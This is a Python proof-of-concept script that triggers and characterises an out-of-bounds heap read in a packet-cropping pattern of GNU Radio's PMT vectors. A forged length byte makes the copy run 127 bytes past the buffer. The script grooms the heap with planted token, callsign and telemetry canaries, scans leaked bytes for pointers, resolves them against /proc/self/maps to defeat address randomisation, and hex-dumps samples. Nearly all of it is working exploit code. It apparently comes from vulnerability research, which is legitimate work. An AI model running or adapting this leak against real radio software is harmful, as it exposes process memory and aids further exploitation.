#!/usr/bin/env python3
"""
F10 Heap-Content Analysis — characterize what leaks

Goals:
  1. Sample many leaks; classify the bytes (zero / ASCII / pointer-like)
  2. Detect pointer values (0x55... or 0x7f... patterns common on Linux x86_64)
  3. Plant identifiable canaries (RF frames, telemetry strings, libc-like
     symbol names) and measure which classes of content leak most often
  4. Read /proc/self/maps to confirm leaked pointers are inside known regions
"""

import gc
import os
import pmt
import re
import struct
import sys
from collections import Counter, defaultdict


# ---------------------------------------------------------------------------
# Trigger
# ---------------------------------------------------------------------------

def trigger_leak(rf_size=131, declared=0xff):
    """Run the cc11xx_packet_crop pattern with attacker-controlled length."""
    rf = bytearray(rf_size)
    rf[0] = declared
    for i in range(1, rf_size):
        rf[i] = ord('a') + (i % 26)
    pdu = pmt.cons(pmt.PMT_NIL, pmt.init_u8vector(rf_size, list(bytes(rf))))
    packet = pmt.u8vector_elements(pmt.cdr(pdu))
    packet_length = packet[0] + 1 + 2  # cc11xx with crc16=True
    out = pmt.init_u8vector(packet_length, packet)
    return bytes(pmt.u8vector_elements(out))


# ---------------------------------------------------------------------------
# Heap conditioning: plant identifiable objects before each trigger
# ---------------------------------------------------------------------------

def plant_short_strings():
    """Allocate short Python strings that may end up adjacent on heap."""
    strs = []
    for i in range(200):
        strs.append(f'TOKEN_{i:04d}_USERDATA'.encode())
    del strs
    gc.collect()


def plant_pmt_frames():
    """
    Plant decoded-frame-like u8vectors. These are the most likely to land
    next to the leaking u8vector on the heap (same allocator class).
    """
    frames = []
    for i in range(200):
        # ~128 byte "decoded telemetry frames"
        data = b'TELEMETRY' + struct.pack('>HHHHHHII', i, i+1, i+2, i+3,
                                          i+4, i+5, 0xDEADBEEF, 0xCAFEBABE)
        data = data + b'\x00' * (128 - len(data))
        frames.append(pmt.init_u8vector(len(data), list(data)))
    del frames
    gc.collect()


def plant_callsigns():
    """Plant ham-callsign-like strings (operator identity leakage scenario)."""
    cs = []
    for i in range(100):
        cs.append(f'KC1XYZ-{i:02d}-OP_DATA'.encode())
    del cs
    gc.collect()


# ---------------------------------------------------------------------------
# Address-region characterization
# ---------------------------------------------------------------------------

def get_proc_maps():
    """Parse /proc/self/maps; return list of (start, end, label) tuples."""
    regions = []
    try:
        with open('/proc/self/maps', 'r') as f:
            for line in f:
                m = re.match(r'^([0-9a-f]+)-([0-9a-f]+)\s+\S+\s+\S+\s+\S+\s+\S+\s*(.*)',
                             line)
                if m:
                    start = int(m.group(1), 16)
                    end = int(m.group(2), 16)
                    label = m.group(3).strip() or '[anon]'
                    regions.append((start, end, label))
    except IOError:
        pass
    return regions


def classify_pointer(addr, regions):
    """Return a label like '[heap]', 'libpython', 'libc', '[stack]', or None."""
    for s, e, lbl in regions:
        if s <= addr < e:
            short = os.path.basename(lbl) if '/' in lbl else lbl
            return short
    return None


def find_pointer_candidates(data):
    """
    Scan a byte buffer for plausible 64-bit user-space pointers.
    On Linux x86_64, valid user pointers are in 0x0000_0000_0000_0000 to
    0x0000_7fff_ffff_ffff and typically have the form 0x00007f????????
    or (for the heap with brk) 0x000055????????
    """
    candidates = []
    for off in range(0, len(data) - 7):
        val = struct.unpack('<Q', data[off:off+8])[0]
        # Look for the 0x00007f... or 0x0000???? patterns
        if 0x10000 <= val <= 0x00007fffffffffff:
            top = val >> 40
            if top in (0x55, 0x56, 0x7e, 0x7f):
                candidates.append((off, val))
    return candidates


# ---------------------------------------------------------------------------
# Main sampling
# ---------------------------------------------------------------------------

def main():
    print('=' * 72)
    print(' F10 HEAP-CONTENT ANALYSIS — what does the leak contain?')
    print('=' * 72)

    regions = get_proc_maps()
    print(f'\n[/proc/self/maps] {len(regions)} regions visible')
    for s, e, lbl in regions[:10]:
        print(f'  {s:016x}-{e:016x}  {lbl}')
    print('  ...')

    # ----- baseline (no conditioning) -----
    print('\n' + '=' * 72)
    print(' [A] BASELINE — no heap conditioning, 1000 samples')
    print('=' * 72)

    all_leaks = []
    pointer_hits = Counter()
    region_hits = Counter()
    canary_hits = Counter()
    nonzero_byte_count = []

    for it in range(1000):
        out = trigger_leak()
        leaked = out[131:]   # OOB region
        all_leaks.append(leaked)
        nonzero_byte_count.append(sum(1 for b in leaked if b != 0))
        for off, val in find_pointer_candidates(leaked):
            pointer_hits[val >> 40] += 1
            label = classify_pointer(val, regions)
            if label:
                region_hits[label] += 1

    print(f'\n  Leaks captured:           1000')
    print(f'  Avg non-zero bytes/leak:  {sum(nonzero_byte_count)/len(nonzero_byte_count):.1f} / 127')
    print(f'  Max non-zero bytes:       {max(nonzero_byte_count)}')
    print(f'  Min non-zero bytes:       {min(nonzero_byte_count)}')
    print(f'\n  Pointer-like value top bytes (count over 1000):')
    for prefix, count in pointer_hits.most_common(10):
        print(f'    0x{prefix:02x}...    {count}')
    print(f'\n  Pointers resolved against /proc/self/maps:')
    for label, count in region_hits.most_common(15):
        print(f'    {label:50s}  {count}')

    # ----- after string-canary planting -----
    print('\n' + '=' * 72)
    print(' [B] PLANTED STRINGS — short token-like strings, 1000 samples')
    print('=' * 72)
    token_hits = 0
    callsign_hits = 0
    pmt_marker_hits = 0
    for it in range(1000):
        plant_short_strings()
        out = trigger_leak()
        leaked = out[131:]
        if b'TOKEN_' in leaked:
            token_hits += 1
        if b'USERDATA' in leaked:
            token_hits += 1
    print(f'  TOKEN_ string visible in leak: {token_hits}/1000 iterations')

    # ----- callsign planting -----
    print('\n' + '=' * 72)
    print(' [C] PLANTED CALLSIGNS — 1000 samples')
    print('=' * 72)
    for it in range(1000):
        plant_callsigns()
        out = trigger_leak()
        leaked = out[131:]
        if b'KC1XYZ' in leaked:
            callsign_hits += 1
        if b'OP_DATA' in leaked:
            callsign_hits += 1
    print(f'  KC1XYZ callsign visible in leak: {callsign_hits}/1000 iterations')

    # ----- PMT frame planting -----
    print('\n' + '=' * 72)
    print(' [D] PLANTED PMT VECTORS — simulated decoded frames, 1000 samples')
    print('=' * 72)
    deadbeef_hits = 0
    telemetry_hits = 0
    for it in range(1000):
        plant_pmt_frames()
        out = trigger_leak()
        leaked = out[131:]
        if b'TELEMETRY' in leaked:
            telemetry_hits += 1
        if b'\xef\xbe\xad\xde' in leaked or b'\xde\xad\xbe\xef' in leaked:
            deadbeef_hits += 1
    print(f'  "TELEMETRY" string in leak:     {telemetry_hits}/1000')
    print(f'  0xDEADBEEF bytes in leak:        {deadbeef_hits}/1000')

    # ----- dump a few representative leaks -----
    print('\n' + '=' * 72)
    print(' [E] SAMPLE LEAK DUMPS — 3 random samples from baseline')
    print('=' * 72)
    import random
    random.seed(42)
    for sample_idx in random.sample(range(1000), 3):
        leak = all_leaks[sample_idx]
        print(f'\n  --- Sample #{sample_idx} ({len(leak)} bytes) ---')
        for off in range(0, len(leak), 16):
            chunk = leak[off:off+16]
            hex_part = ' '.join(f'{b:02x}' for b in chunk)
            ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
            print(f'  +{131+off:04x}  {hex_part:<48}  |{ascii_part}|')
        # Annotate pointers
        for off, val in find_pointer_candidates(leak):
            label = classify_pointer(val, regions)
            if label:
                print(f'    -> offset {off}: 0x{val:016x} -> {label}')

    print('\n' + '=' * 72)
    print(' SUMMARY')
    print('=' * 72)
    print(f'  Leak success rate (any non-zero byte):  {sum(1 for n in nonzero_byte_count if n > 0)}/1000')
    print(f'  Average heap bytes leaked per frame:    {sum(nonzero_byte_count)/len(nonzero_byte_count):.1f}/127')
    print(f'  Pointers found across 1000 samples:     {sum(pointer_hits.values())}')
    print(f'  Unique pointer regions:                 {len(region_hits)}')


if __name__ == '__main__':
    main()
